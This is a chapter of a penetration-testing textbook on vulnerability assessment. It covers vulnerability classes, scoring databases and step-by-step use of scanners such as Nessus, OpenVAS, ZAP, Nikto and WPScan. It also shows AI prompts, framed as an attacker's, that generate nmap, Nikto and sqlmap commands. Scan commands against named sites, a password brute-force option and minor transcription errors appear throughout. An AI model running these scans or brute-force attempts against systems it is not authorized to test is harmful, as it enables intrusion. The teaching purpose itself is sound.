Table 5.1 systematically categorizes common cybersecurity vulnerabilities that organizations may encounter. It is designed to aid in the identification, understanding, and prioritization of potential weaknesses within information technology environments. Each category represents

a specific type of risk that could be exploited by malicious actors to gain unauthorized access, disrupt services, or compromise data integrity. From the misconfigurations that can arise

from human error to the inherent flaws within operating systems or applications, the clas-

sification serves as a roadmap for cybersecurity professionals to address and remediate these vulnerabilities. Additionally, it highlights the importance of regular updates and the dangers of leaving systems with default settings. This strategic approach to vulnerability management is crucial in building a robust security posture against evolving cyber threats.

• Misconfiguration: This refers to improper setup or configuration of systems and soft-

ware, which can create security gaps.

• Default Installations: This points to the risk associated with systems or software

installed with default settings, which may be insecure.

• Buffer Overflows: A condition where an application writes more data to a buffer than

it can hold, potentially leading to code execution vulnerabilities.

• Unpatched Servers: Servers not updated with the latest security patches, leaving known

vulnerabilities unaddressed.

• Design Flaws: Weaknesses in system or application architecture that could be exploited.

• Operating System Flaws: Security issues inherent to the operating system itself.

• Application Flaws: Vulnerabilities that exist within the software applications.

• Open Services: Unnecessary services running on a system that may provide attack

vectors.

• Default Passwords: Use standard or default passwords that can be easily guessed or

found in documentation.



• Zero-

day/Legacy Platform Vulnerabilities: Unknown vulnerabilities (zero-

days) or

known issues in outdated platforms that are no longer supported with security updates.





146 Traditional vs Generative AI Pentesting

Table 5.1 Vulnerability classification

Vulnerability type

Description

Examples

Misconfigurations/Weak

Misconfigurations occur when systems,

- Network Misconfigurations:

Configurations

applications, or devices are not

Insecure protocols, open ports

configured correctly, leaving them

and services, errors, and weak

susceptible to exploitation. It allows

encryption.

attackers to break into a network

- Host Misconfigurations:

and gain unauthorized access to

Open permissions and

systems.

unsecured root accounts.

Application Flaws

Application flaws are vulnerabilities

- Buffer overflows

in applications that are exploited

- Memory leaks

by attackers. Flawed applications

- Resource exhaustion

pose security threats such as data

- Integer overflows

tampering and unauthorized access

- Null pointer/object dereference

to configuration stores.

- DLL injection

- Race conditions

- Improper input and error

handling

- Code signing weaknesses

Poor Patch Management

Software vendors provide patches that

- Unpatched servers

prevent exploitations and reduce

- Unpatched firmware

the probability of threats exploiting

- Unpatched operating systems

a specific vulnerability. Unpatched

(OS)

software can make an application,

- Unpatched applications

server, or device vulnerable to

various attacks.

Design Flaws

Logical flaws in the functionality of the

- Incorrect encryption

system are exploited by attackers to

- Poor validation of data

bypass the detection mechanism and

acquire access to a secure system.

Third- Party Risks

Third- party services can have access to

- Vendor management risks

privileged systems and applications,

- Supply- chain risks

through which financial information,

- Outsourced code development

customer and employee data, and

- Data storage risks

processes in the enterprise’s supply

- Cloud- based vs. on- premises

chain can be compromised.

risks

VULNERABILITY RESEARCH

Vulnerability research analyzes protocols, services, and configurations to uncover vulner-

abilities and design flaws that make an operating system and its applications susceptible to exploitation, attacks, or misuse (Austin & Williams, 2011). This critical assessment aims to identify and categorize the vulnerabilities based on the severity of the threat they pose, ranging from low to high, and the potential reach of exploitation, whether local or remote. A

network administrator requires vulnerability research to:

• Gather Security Intelligence: It’s essential to collect information on security trends, threats, attack surfaces, and attack vectors and techniques. This helps you stay ahead

of potential threats and understand the current landscape of cybersecurity risks.

• Discover System Weaknesses: Identifying vulnerabilities in operating systems and applications is paramount. The goal is to promptly alert the network administrator of these

weaknesses, ideally before any network attack occurs.





Vulnerability assessment 147

• Information Gathering for Security: Accruing data is not only about immediate threats but also aids in preventing security issues. It equips administrators with knowledge

crucial for strategic defense planning.

• Prepare for Recovery: Knowing how to recover from a network attack is as important as prevention. Vulnerability research provides insights into effective recovery strategies

and helps develop robust incident response protocols.

WHAT IS VULNERABILITY ASSESSMENT?

Vulnerability assessment is an in- depth examination of a system’s or application’s capacity of a system or application, including current security procedures and security controls, to resist exploitation. It is used to identify, measure, and classify security vulnerabilities systems, network and communication channels (Fekete et al., 2010). Figure 5.1 presents the different information you can find in a vulnerability assessment.

Characteristics of a good vulnerability assessment solution

Organizations should choose an appropriate and tailored vulnerability assessment solution

to detect, assess, and protect their critical IT assets from various internal and external threats (Möller, 2023). The characteristics of a good vulnerability assessment solution include:

• It verifies the network, OS, ports, protocols, and resources to provide accurate findings.

• It tests using a structured, inference- based method.

• It thoroughly checks up- to- date databases automatically.

• It generates reports that are concise, practical, and adaptable, including reporting on

vulnerabilities categorized by severity and trend analysis.

• It supports various networks.

• It provides suitable solutions and workarounds to address security flaws.

• It adopts the attackers’ point of view to accomplish their objective.

Figure 5.1 Vulnerability assessment information.





148 Traditional vs Generative AI Pentesting

VULNERABILITY ASSESSMENT SYSTEMS AND DATABASES

• Common Vulnerability Scoring System (CVSS): CVSS is an open framework for com-

municating the characteristics and severity of software vulnerabilities (Fekete et al.,

2010). Its scoring system enables IT professionals to prioritize vulnerability remediation efforts by evaluating the impact, ease of exploitation, and other characteristics of

a security flaw. Scores are assigned based on a numerical scale typically ranging from 0

to 10, with higher values representing greater severity.

• Common Vulnerabilities and Exposures (CVE): CVE is a list of publicly disclosed cybersecurity vulnerabilities and exposures. Each entry contains an identification number, a

description, and at least one public reference for publicly known cybersecurity vulner-

abilities (Vulnerabilities, 2005). The CVE List provides a standardized identifier for a given vulnerability, facilitating data exchange between various tools and databases.

• National Vulnerability Database (NVD): The NVD is the U.S. government repository

of standards- based vulnerability management data. It includes all CVE entries, addi-

tional analysis, impact ratings, and technical details. The NVD also integrates CVSS

scores and provides advanced search capabilities, making it a comprehensive source of

vulnerability data that is updated regularly (Booth et al., 2013).

• Common Weakness Enumeration (CWE): CWE is a category system for software weak-

nesses and vulnerabilities. It provides a standardized language for describing known

issues within software code that could lead to vulnerabilities. CWE is designed to serve

as a common reference for identifying, mitigating, and preventing software weaknesses

across the lifecycle of software development and deployment (Christey et al., 2013).

Types of scanners

Vulnerability scanners can be categorized based on their objectives and functionalities:

General- purpose scanners

These scanners aim to detect vulnerabilities across a wide array of applications, services, and operating systems. Examples include:

• Nessus

• Nexpose

• Qualys

Web application scanners

Specifically designed to identify vulnerabilities within web applications, such as insecure input handling or misconfigured web servers. Examples include:

• AppScan

• NetSparker

Specific application scanners

These scanners focus on vulnerabilities related to a specific application or service. Examples include:





Vulnerability assessment 149

• SSLScan

• OneSixtyOne

• WPScan

Scanner types by authentication

Unauthenticated scanners

• Most commonly used by penetration testers.

• Access targets through the network without authentication credentials.

• Cannot identify client- side software issues or vulnerabilities related to user- specific applications (e.g., Office suites, PDF readers, browsers).

Authenticated scanners

• Less commonly used in penetration tests but provide deeper insights.

• Utilize network access along with credentials to query the target system.

• Capable of identifying vulnerabilities in software not exposed via the network.

Agent- based scanners

• Rarely used by penetration testers but valuable for detailed vulnerability assessments.

• Agents are deployed on target systems to monitor and report issues back to a central-

ized system.

• Functionality is similar to authenticated scanners, with the added advantage of active

communication with a central reporting hub.

RESOURCES FOR VULNERABILITY RESEARCH

Here are some of the websites used to conduct vulnerability research:

• Microsoft Security Response Center ( https:// msrc. microsoft. com)

• Packet Storm ( https:// packetstormsecurity. com)

• Dark Reading ( https:// www. darkreading. com)

• Trend Micro ( https:// www. trendmicro. com)

• Security Magazine ( https:// www. securitymagazine. com)

• PenTest Magazine ( https:// pentestmag. com)

• SC Magazine ( https:// www. scmagazine. com)

• Feat Database ( https:// www. exploit- db. com)

• Help Net Security ( https:// www. helpnetsecurity. com)

• HackerStorm ( http:// www. hackerstorm. co. uk)

• Computerworld ( https:// www. computerworld.com)

• D’Crypt (https://www.d- crypt.com)

VULNERABILITY ASSESSMENT TOOLS

Nessus

Nessus is a scanner vulnerability. It uses techniques similar to Nmap to find and report vulnerabilities, which are then presented in a nice- to- the- eye graphical interface (Kumar, 2014).





150 Traditional vs Generative AI Pentesting

Nessus is different from other scanners because it doesn’t make assumptions when scanning,

as if the web app would run on port 80 for example. Nessus offers a free service and a paid service, and some features are excluded from the free service to entice you to purchase the paid service. The free version is sufficient for our penetration testing needs.

Installation

Nessus is not installed by default on Kali Linux. It must be installed:

1. Visit: https://www.tenable.com/products/nessus/nessus- essentials and create an account.

2. Next, we’re going to download the Nessus file- #.##.#-debian6_amd64.deb and Save it

to your/downloads/folder.

3. In the terminal, we’ll navigate to this folder and run the following command: sudo

dpkg -i package_file.deb Don’t forget to replace package_file.deb with the file name you downloaded.

4. We will start the Nessus service with command: sudo systemctl start nessusd.service

(Figure 5.2).

5. Open Firefox and navigate to the URL Following: https://localhost:8834/.

Figure 5.2 Nessus connection interface.





Vulnerability assessment 151

Scan console

You have now installed Nessus successfully and you’ll have a home console like this

(Figure 5.3).

Start a scan

• To start a scan, we simply click on “New Scan”, a Scan Templates policy section appears

to choose the type of scan.

• For our penetration testing needs, we are only interested in the first two types of scans:

• Discovery: This scan just allows us to confirm that the target host is active.

• Vulnerabilities: These types of scans allow us to scan the target host for the purpose

of identifying vulnerabilities (Figure 5.4).

Figure 5.3 Console Nessus.

Figure 5.4 Scan templates Nessus.





152 Traditional vs Generative AI Pentesting

Run a basic scan

Among the types of scans available, the basic scan on Nessus is a method for detecting vulnerabilities on a specific target, such as a computer, server, network device, or set of connected devices. This method uses scanning techniques to identify open ports, running services, and potential vulnerabilities on targets. Basic scanning can be performed for different types of scans, including vulnerability scanning, the compliance scan, and the configuration scan.

• Click on “New Scan” on the dashboard.

• On the “Create New Scan” page, enter a name for your scan in the “Scan Name” field.

• In the “Description” field, enter an optional description for your scan.

• Select the type of scan you want to perform. There are several scan options available,

including vulnerability scanning, compliance scan, configuration scan, etc.

• In the “Targets” section, enter the IP address of the target you want to scan. You can

also scan multiple targets by specifying an IP address range.

• If you want to exclude certain IP addresses from your scan, add them in the “Exclusions”

section.

• In the “Scan Settings” section, choose the appropriate options for your scan. For exam-

ple, you can enable or disable vulnerability detection, specify the level of detail of the

scan, and so on.

• Click the “Start Scan” button to start the scan.

• Wait for the scan to complete. The scan time will depend on the size of the network and

the scan options chosen.

• Once the scan is complete, you can view the results by clicking on the scan name in the

list of scans on the dashboard. The scan results include information about the vulner-

abilities found, recommended fixes, and security actions to take (Figure 5.5).

Figure 5.5 Basic Nessus scan.





Vulnerability assessment 153

Figure 5.6 Basic Nessus scan result.

Because it is a network scan, vulnerabilities are information retrieved from the target host.

We can click on each row to see the details. Figure 5.6 shows the results of a basic scan.

You can click on a vulnerability, to discover its description, CVSS score, and the solution.

Figure 5.7 illustrates a critical vulnerability in macOS 13.x < 13.2 (HT213605), along with the solution. A migration to macOS 13.2 or later addresses this vulnerability.

Run a web scan

• Among the most interesting types of scans, the scan to identify application vulnerabili-

ties for a target website: Web Application Tests.

• We need to name the scan and we can change the scan options or add authentication

information if the scanner Needs to authenticate to scan the target website.

• For our example, we’re going to scan Website: vulnweb.com.

• It is possible to save the scan to be started later.

• In our case, we start the scan by clicking launch (after clicking on the arrow next to

save) and the scan will be started Figure 5.8.



154

Traditional vs Generativ

e AI P

entesting

Figure 5.7 macOS 13.x < 13.2 critical vulnerability (HT213605).





Vulnerability assessment 155

Figure 5.8 Scan web Nessus.

Web Scan Results (Figure 5.9)

Figure 5.9 Nessus web scan result.





156 Traditional vs Generative AI Pentesting

Rapid7 Nexpo

• Nexpose is a scanner by Rapid7. Rapid7 is the same company that produces Metasploit,

and one of the main advantages if you are a Metasploit user is the way Nexpose inte-

grates its results into it. Nexpose can be used in a Linux/UNIX or Windows environ-

ment. You can download the 30-day demo version from this link: https://www.rapid7.

com/products/insightvm/download.

• After installation, you can access the console via the link https://localhost:3780, the console takes a little time to load, as you can see in Figure 5.10.

Once the page loads, you will have the authentication page (Figure 5.11).

Running Vulnerability Scanning

• To start a new scan, go to the home page, click the Create drop- down menu, and select

Site. The Security Console will display the “Site Configuration” screen.

In the General tab, we need to give the name and description of our site, as in Figure 5.12. We can even define its importance from very low to very high (Figure 5.13).

In the Assets menu, you set the IP address range to be scanned (Figure 5.14).

Figure 5.10 Rapid7 console loading.





Vulnerability assessment 157

Figure 5.11 Rapid7 connection interface.

Figure 5.12 New rapid scan7.





158 Traditional vs Generative AI Pentesting

Figure 5.13 Configuring scan rapid7.

Figure 5.14 IP address range configuration.





Vulnerability assessment 159

Figure 5.15 Scan rapid7 results.

• Once the scan is complete, the result clearly shows the number of vulnerabilities pos-

sessed, the risk score, and the duration of the scan. We can now see all the mentioned

vulnerabilities along with their CVSS score (Common Vulnerability Scoring System)

from highest to lowest in the Vulnerabilities tab. The interesting part is that one or

more of these exploits have been published in the Exploit database and are vulnerable

to many Metasploit (Figure 5.15).

The Vulnerabilities page has charts that show your vulnerabilities based on actionable skill levels and CVSS scores. The number of vulnerabilities that fall within each CVSS score range is displayed on the score chart. The data impact, authentication requirements, and complex-ity of access determine this grade. You should give more attention to the vulnerabilities that have the highest scores (from 1 to 10; 10 being the worst).

OpenVAS

OpenVAS (Open Vulnerability Assessment System) is a scanner. A free and open- source

vulnerability tool that helps identify security vulnerabilities in computer systems and networks (Rahalkar & Rahalkar, 2019). It is designed to be scalable, easy to use, and flexible.

OpenVAS includes a variety of security tests that can identify vulnerabilities in network services, operating systems, and applications. It can also be used to perform compliance checks against security standards such as PCI- DSS, HIPAA, and CIS. OpenVAS consists of two main

components: the OpenVAS scanner, which performs vulnerability scans, and the OpenVAS

Manager, which coordinates the scanning process and provides a web- based user interface

for managing and configuring scans.



160 Traditional vs Generative AI Pentesting

OpenVAS is compatible with a wide range of operating systems and can scan both local

and remote systems. It is a popular tool among security professionals, system administrators, and network engineers to identify and address security vulnerabilities in their environments.

Step 1: Install OpenVAS on Kali Linux

Making sure our Kali installation is current should be our top priority. Hence, launch a terminal window and type in:

sudo apt update & sudo apt upgrade -y

By appending -y to the command, you may avoid hitting the “Y” button while it updates

your Kali and repository. We intend to install OpenVAS as our next step. The Terminal type

is used once more:

sudo apt install openvas

By pressing Y, you are confirming that you are aware that an extra approximately 1.2 giga-

bytes of disc space will be utilized.

This is going to take a long time. While we wait, you may brew some Yerba Mate or have

a cup of coffee.

Following this, we will execute an additional command in the terminal window (Figure 5.16):

sudo gvm- setup

All OpenVAS processes will begin running and the web interface will open immediately after

setup is finished. You may view the web interface by going to https://localhost:9392. It runs locally on port 9392. The final piece of the setup output displays the password that OpenVAS

automatically generates for the admin account that it sets up.

Figure 5.16 Installing the OpenVAS console.





Vulnerability assessment 161

Step 2: Configuring OpenVAS

The installation is now complete. Then we check if our installation is working.

sudo gvm- check- setup

First, we start the OpenVAS service (Figure 5.17).

sudo GVM- Start

At this point, you should be able to use your OpenVAS service. In addition to Port80,

OpenVAS listens on Ports 9390, 9391, and 9392. You should be able to access the OpenVAS

login page using your web browser.

If it doesn’t, then launch a browser and type in the following URL by hand: at the address

https://127.0.0.1:9392.

A security warning will be displayed the first time you attempt to access this URL. Move

to the Advanced section and then click on Add Exception (Figure 5.18).

Figure 5.17 Launching the OpenVAS console.

Figure 5.18 OpenVAS access URL.



162 Traditional vs Generative AI Pentesting

Figure 5.19 OpenVAS connection interface.

Have you forgotten the password you previously put down? It will be necessary for us.

If you can’t remember the password for the administrator account. Just type to reset it

(Figure 5.19).

sudo gvmd --user=admin --new-

password=passwd;

Log in to OpenVAS with admin // your password

First, navigate to your user profile /My Settings / Click Edit and change the password

(Figure 5.20).



Vulnerability assessment

Figure 5.20 OpenVAS dashboard.

163





164 Traditional vs Generative AI Pentesting

Figure 5.21 Launching OpenVAS scan.

OpenVAS is now operational and ready for use.

Step 3: Start your first Scan

Once the analysis is complete, we can view the results by hovering over the Analytics tab at

the top of the screen and clicking (Figure 5.21). Results from the drop- down menu will display a summary of all the vulnerabilities found by OpenVAS (Figure 5.22).

OpenVAS is a vulnerability testing solution Very efficient and powerful. This project

includes general information about OpenVAS in the first part and a useful demonstration

of its use in the second part. Reducing the frequency and severity of assaults by addressing known vulnerabilities in networks is the primary objective. In order to do this, OpenVAS

conducts thorough inspections of several areas, including firewalls, apps, and services, with the goal of gaining illegal access to the networks and assets of the business. In order to find vulnerabilities and have them patched fast, these possible weak spots are compared to a

database of known flaws.

Nikto (Source: https://cirt.net)

Nikto is an open- source scanner for web servers that performs checks for a wide variety

of issues, including over 6700 malicious files and applications. It ensures that over 1300

servers are not running outdated versions, and checks over 270 servers for version- specific problems. In addition, it tries to detect web servers and installed software, as well as examine server configuration variables including HTTP server settings and the presence of numerous

index files.



Vulnerability assessment

Figure 5.22 Sample OpenVAS scan report.

165





166 Traditional vs Generative AI Pentesting

Characteristics

• Support SSL (Unix with OpenSSL or maybe Windows with ActiveState’s Perl/NetSSL).

• Full Proxy Support HTTP.

• Checks for obsolete server components.

• Saves reports in plain text, XML, HTML, NBE, or CSV.

• A template engine to easily customize reports.

• Scan multiple ports on a server or multiple servers via an input file.

• IDS Encoding Techniques by LibWhisker.

• Identification of installed software via headers, favicons, and files.

• Host Authentication with Basic and NTLM.

• Determining subdomains.

• Enumeration Apache and cgiwrap usernames.

• Setting the scan to include or exclude entire classes of vulnerability checks.

• Guesses credentials for authorization domains (including many default ID and pass-

word combinations).

OWASP Zap (https://www.zaproxy.org)

OWASP ZAP (Zed Attack Proxy) is a free, open- source web application security testing tool

developed by the Open Web Application Security Project (OWASP) (Jakobsson & Häggström,

2022). It is designed to help developers and security professionals identify vulnerabilities and security issues in web applications. ZAP offers a wide range of functions and options

for security testing, including spideringscanning and fuzzing. It also includes various tools for manual testing, such as a proxy and a scripting console. Here are some of OWASP’s key

features ZAP:

• Intercepting and modifying HTTP requests and responses.

• Automated analysis of common web application vulnerabilities, such as cross- site

scripting (XSS), SQL injection, and CSRF.

• Active and passive scanning modes for vulnerability detection.

• Support for authentication and session management tests.

• Fuzzing tools to test input validation and error handling.

• API for automation and integration with other tools and frameworks.

• User- friendly graphical user interface (GUI) and command line interface (CLI).

Automated scanning

To perform an automated scan, simply click on Automated Scanning (Bau et al., 2010) and enter the target website you want to scan. If you click on the Firefox title, you can choose the

web browser from which to scan the target (Figure 5.23).

You can see the results in Figure 5.24, and on the left- hand side of the dashboard, you can see the sites. If you click on them, you can see posts, pages, and everything else the zap hash has scanned.

Alerts

You can click on the alerts to find pages and links likely to be vulnerable. The following

example relates to a vulnerability Remote Code Execution—CVE- 2012- 1823 (Figure 5.25).



Vulnerability assessment



Figure 5.23 Launching the OWASP ZAP automated scan.

167



168

Traditional vs Generativ

e AI P

entesting

Figure 5.24 OWASP ZAP automated scan result.





Vulnerability assessment 169

Figure 5.25 Scan OWASP ZAP alerts.

Generate a report

It’s easy to export results in HTML format. Just click on “Generate report” in the top right-hand corner and you can customize it (Figure 5.26).

Figure 5.27 presents a vulnerability assessment report generated by OWASP ZAP.

Check whether the target is protected by a Web Application Firewall (WAF) (Chakir

and Sadqi, 2025). Use the wafwOOf tool to detect the WAF in front of the target website (Figure 5.28).





170 Traditional vs Generative AI Pentesting

Figure 5.26 OWASP ZAP scan report generation.

Figure 5.27 OWASP ZAP report.

Scan web servers and applications for vulnerabilities using Nikto

Here, we’re going to use Niko to scan web servers and applications for vulnerabilities.

Note: In this task, we’re going to target the www.certifiedhacker.com website.

You can also type nikto -H and press Enter to bring up the various commands available

with the full help text (Figure 5.29).





Vulnerability assessment 171

Figure 5.28 wafwOOf tool.

Figure 5.29 Nikto tool help menu.





172 Traditional vs Generative AI Pentesting

Figure 5.30 Tuning+ mode on nikto.

The result appears, displaying the different options available in Nikto. We’re going to use the Tuning option to perform a deeper and more complete scan on the web server target.

Note: A tuning scan can be used to reduce the number of tests performed on a target. By specifying the type of test to include or exclude, faster, targeted testing can be performed. This is useful in situations where the presence of certain file types such as XSS or simply “interesting” files is unwanted (Figure 5.30).

In the terminal window, type: nikto h- (Target Website) -Tuning x (Here, the target website is www.certifiedhacker.com) and press Enter. Nikto Starts the scan with all tuning options enabled.

Note: -h: specifies the target host, and x: specifies reverse tuning options (i.e., they include everything except what is specified).

Note: The scan takes about 10 minutes. The result appears, displaying various information such as server name, IP address, target port, recovered files, and details of website vulnerabilities target (Figure 5.31).

This concludes the demonstration of checking the target website for vulnerabilities using

Nikto.

Scan wordpress sites with WPscan

WPScan is an open- source tool from PT (PT) which is used to identify security vulnerabili-

ties in websites running on WordPress. It uses a database of known vulnerabilities to look

for potential vulnerabilities in WordPress installations and installed plugins. WPScan uses several scanning techniques to identify security vulnerabilities, such as brute force scans for usernames and passwords, version scans to identify WordPress versions and installed plugins, and vulnerability scans to identify known vulnerabilities in these releases. It can also identify registered users, WordPress themes, sensitive files, and configuration vulnerabilities. WPScan



Vulnerability assessment 173

Figure 5.31 Nikto scan result in tuning mode.

has a set of commands that you can use to perform security scans on WordPress sites. Here

are some of the most commonly used commands:

• wpscan --url <URL>: This command allows you to run a basic security scan on a

WordPress site by specifying the URL of the site. WPScan will then scan versions of

WordPress and installed plugins, registered users, themes, etc.

• wpscan --enumerate p: This command is used to enumerate the plugins installed on a

WordPress site.

• wpscan --enumerate t: This command is used to enumerate the themes installed on a

WordPress site.

• wpscan --enumerate u: This command is used to enumerate registered users on a

WordPress site.

• wpscan --passwords <file>: This command allows you to brute- force a username and

password attack by specifying a password list file.

• wpscan --update: This command is used to update the WPScan vulnerability database.

• wpscan --url <URL> --enumerate vp: This command is used to scan for known vulner-

abilities in plugins installed on a WordPress site.

• wpscan --url <URL> --wp- content- dir <directory>: This command allows you to specify the custom directory where the WordPress content is stored.





174 Traditional vs Generative AI Pentesting

Figure 5.32 wpscan tool.

These commands are just an example of WPScan’s functionality. You can find a full list of

commands in the official WPScan documentation or the wpscan tool help.

Figure 5.32 shows an example of a basic security scan on a WordPress netcomdays.ma site.

Wordpress scan through AI

Prompt: sgpt --chat scan --shell “Generate a WPScan command to detect vulnerabilities on a

WordPress site at blog.example.com.”

• Automated scanning tools save us a lot of time and make it easier for us to find the most easily discovered vulnerabilities. However, “false positives” is a recurring problem for

these types of tools. For this reason, it is recommended to assess vulnerabilities identi-

fied manually or using other specialized tools or scripts.

• In this chapter, we will give some examples of widely used protocols. However, each

protocol or service identified during nmap or Nessus scans/nexpose needs to be thor-

oughly investigated to test for vulnerabilities and misconfigurations.

• Table 5.2 shows a comparison between automated tools and manual validation.

Table 5.2 Comparison of automated tools and manual validation

Scanning of automated tools

Manual testing

Do not provide more in- depth information about

Provide detailed and deeper information about

vulnerabilities.

vulnerabilities.

They discover common security vulnerabilities

They detect difficult flaws that are often missed

such as missing update, faulty authorization rules,

by a scanner such as business logic errors, flaws,

configuration flaws, with astonishing efficiency.

coding flaws, etc. It also involves exploiting these

vulnerabilities to assess the impact on the system.

This can be done frequently without much

It takes effort and time, so can’t be done frequently.

preparation and planning.

It’s quick to execute and saves a lot of time.

Manual testing can take days to complete.





Vulnerability assessment 175

VULNERABILITY ASSESSMENT USING AI

AI- powered technologies are revolutionizing the process of vulnerability scanning by auto-

mating and enhancing its effectiveness. Attackers can leverage these tools to identify potential vulnerabilities on a target system with minimal effort. By utilizing advanced algorithms and machine learning, AI can detect security weaknesses quickly and accurately, making it a double- edged sword in the realm of cybersecurity.

For example, tools such as ChatGPT can be employed to generate automated commands

that assist in vulnerability assessment. These commands can direct specific tools to perform vulnerability scans with precise parameters.

Example usage

An attacker might use a prompt like the following to initiate a vulnerability scan:

• Example #1: “Launch Nikto to execute a scan against the URL www.certifiedhacker.

com to identify potential vulnerabilities.”

Figure 5.33 demonstrates how AI- driven platforms can facilitate vulnerability scanning by streamlining the setup and execution of scanning tools, highlighting the importance of incorporating robust defenses against such automated threats.

The provided command demonstrates how to utilize the Nikto web server scanner to identify potential vulnerabilities in a target URL. Here’s a breakdown of the command:

Command Syntax:

nikto -h www.certifiedhacker.com

Figure 5.33 Lunch Nikto to execute a scan against the URL.





176 Traditional vs Generative AI Pentesting

Explanation

• nikto: This invokes the Nikto tool, a widely used web server scanner. Nikto performs comprehensive security checks on web servers to identify vulnerabilities, outdated software, and server misconfigurations.

• -h www.certifiedhacker.com:

• The -h option specifies the target host (in this case, www.certifiedhacker.com) for scanning. Nikto will execute various tests against this URL to detect security issues and

vulnerabilities, such as:

• Open directories

• Insecure configurations

• Known vulnerabilities in server software.

This command is straightforward and demonstrates Nikto’s capability to identify and report

on potential threats, making it a valuable tool for penetration testers. The following com-

mand demonstrates how to conduct a vulnerability scan on a specified target URL using

Nikto, with the results saved to a specified file.

Command:

nikto -h http://testphp.vulnweb.com -o output.txt

Explanation

• nikto: Invokes the Nikto vulnerability scanner to conduct the assessment.

• -h http://testphp.vulnweb.com: Specifies the target URL to scan for vulnerabilities. In this case, http://testphp.vulnweb.com is the target.

• -o output.txt: Defines the output file (output.txt) where the scan results will be stored.

This is useful for reviewing findings later or sharing results with other stakeholders.

As shown in Figure 5.34, this command is particularly helpful when you need to document your findings or analyze them after the scan. The stored output can be integrated into reports or further processed for deeper insights.

Vulnerability scanning using Nmap with AI

Artificial intelligence enables automated and efficient vulnerability scanning. With tools such as Nmap, attackers—or security professionals—can analyze systems for potential weaknesses. AI- powered technologies further enhance this process by generating optimized com-

mands and interpreting results effectively.

Figure 5.34 Nikto test against web servers.





Vulnerability assessment 177

Example Task: A user can initiate a vulnerability scan using Nmap and store the results by executing the following prompt:

Prompt: “Perform a vulnerability scan on the target URL www.moviescope.com with Nmap and save the results in output.txt.”

Command example

nmap -sV --script=vuln www.moviescope.com -oN output.txt

• nmap: Launches the Nmap tool to perform network scanning.

• -sV: Enables service version detection to identify applications and services running on the target.

• --script=vuln: Executes Nmap’s vulnerability scanning scripts, identifying known

vulnerabilities.

• www.moviescope.com: Specifies the target URL for scanning.

• -oN output.txt:

Saves the output in a file named output.txt in normal format for documentation.

As shown in Figure 5.35, this command combines Nmap’s powerful scanning capabilities with AI- generated insights to detect vulnerabilities and document results for further analysis.

Vulnerability assessment using Python script and AI

Attackers can utilize AI- powered tools to craft and execute custom Python scripts for automating vulnerability scanning. By employing such scripts, attackers efficiently detect potential vulnerabilities across multiple targets. These scripts enhance scanning speed and accuracy by integrating tools such as Nmap for reconnaissance and Nikto for detailed vulnerability

detection.

Concept and approach

Using AI tools such as ChatGPT, an attacker could automate the process by:

1. Running initial scans with Nmap to identify targets or vulnerabilities across a range of IPs.

2. Following up with Nikto scans to perform in- depth vulnerability analysis.

Figure 5.35 Perform a vulnerability scan on target URL.





178 Traditional vs Generative AI Pentesting

Figure 5.36 Python script that executes NMAP and Nikto scans.

An attacker might leverage AI to generate a script with the following request:

Create a Python script to run a fast but comprehensive Nmap scan on the IP addresses

listed in scan1.txtand subsequently execute vulnerability scanning using Nikto for each

IP address in scan1.txt.

This sequence provides a streamlined workflow for vulnerability identification, ensuring both breadth and depth in the scanning process, as shown in Figure 5.36.

Skipfish vulnerability scanning with AI

Skipfish is another tool that can be combined with AI for web application vulnerability detection, as shown in Figure 5.37.

Example Command: Command: “Perform a vulnerability scan on target URL http://

testphp.vulnweb.com with Skipfish and display the output in index.html using Firefox.”

Database vulnerability assessment

Prompt: sgpt --chat scan --shell “Generate a SQLmap command to test for SQL injection

vulnerabilities on the website example.com” (Figure 5.38).





Vulnerability assessment 179

Figure 5.37 Prompt that executes the skipfish command.

Figure 5.38 Prompt that executes Sqlmap Scan.





180 Traditional vs Generative AI Pentesting

VULNERABILITY ASSESSMENT REPORTS

Vulnerability assessment reports are comprehensive documents detailing findings from a

vulnerability assessment process. These reports include identified security weaknesses, their potential impact, severity levels, and recommendations for remediation. Their primary goal

is to provide stakeholders with a clear understanding of the security posture of assessed systems, applications, or networks and to guide them in taking corrective measures to mitigate risks.

Structure of vulnerability assessment reports

The reports typically include key sections that categorize and explain vulnerabilities in detail:

• Executive Summary: Provides an overview of the assessment, highlighting critical findings and remediation strategies. It also includes the scope of the assessment and an

outline of scanning results based on severity levels.

• Assessment Overview: Describes the methodology, tools used, and target information such as hostnames and operating systems.

• Findings: Lists detailed information about vulnerabilities, including affected systems, types of vulnerabilities identified, and descriptions of their impact.

• Risk Assessment: Categorizes vulnerabilities based on risk levels such as high, medium, or low. It identifies potential threats and critical hosts requiring immediate attention.

• Recommendations: Offers specific remediation strategies, such as applying patches, conducting root- cause analyses, and implementing fixes to address identified risks.

• Conclusion: Summarizes the report’s findings and emphasizes the importance of

addressing vulnerabilities.

• Follow- Up Actions and Timeline: Outlines a plan for re- assessment and follow- up actions to ensure the vulnerabilities have been mitigated.

• Glossary of Terms: Defines technical terminology used in the report for ease of understanding by all stakeholders.

Components of a vulnerability assessment report

Each component of the report serves a specific purpose to ensure a thorough understanding

of the security risks and mitigation strategies:

• Findings: These include:

• The vulnerability’s name and its mapped CVE ID

• Date of discovery

• Description and impact of the vulnerability

• Affected systems and corrective steps required

• Proof of concept (if applicable)

• Risk Levels: Vulnerabilities are categorized into high, medium, and low severity levels.

High- risk vulnerabilities are addressed with priority to prevent unauthorized access

and system compromise.

• Recommendations and Implementation Plans: These include actionable steps, such as awareness training, periodic assessments, and policy implementation to prevent recurrence of vulnerabilities.





Vulnerability assessment 181

Classification of reports

Vulnerability assessment reports can be categorized into:

• Security Vulnerability Reports: These combine all findings across scanned systems, including open ports, remediation suggestions, and patch links.

• Security Vulnerability Summaries: Focus on individual devices or systems, providing a concise overview of current security flaws, categories of vulnerabilities, and resolved

vulnerabilities.

CONCLUSION

This chapter provided an in- depth exploration of vulnerability assessment, covering the processes of classification, research, and assessment of cybersecurity vulnerabilities. It detailed the methodologies and characteristics of effective vulnerability assessment solutions, emphasizing their role in proactively identifying risks. The integration of tools such as Nessus, OpenVAS, Rapid7 Nexpose, and OWASP ZAP was thoroughly discussed, highlighting their

functionalities and practical applications. Furthermore, the chapter introduced AI- powered solutions that enhance the efficiency and precision of vulnerability scanning, demonstrating the growing importance of automation in cybersecurity.

Through case studies and examples, this chapter underscored the significance of struc-

tured vulnerability management processes, from scanning and identifying risks to generating actionable reports. It concluded by reinforcing the importance of combining automated and

manual testing approaches, regular monitoring, and continuous updates to mitigate risks

effectively. This comprehensive approach equips organizations and cybersecurity profession-

als with the means to address the challenges posed by an ever- evolving threat landscape,

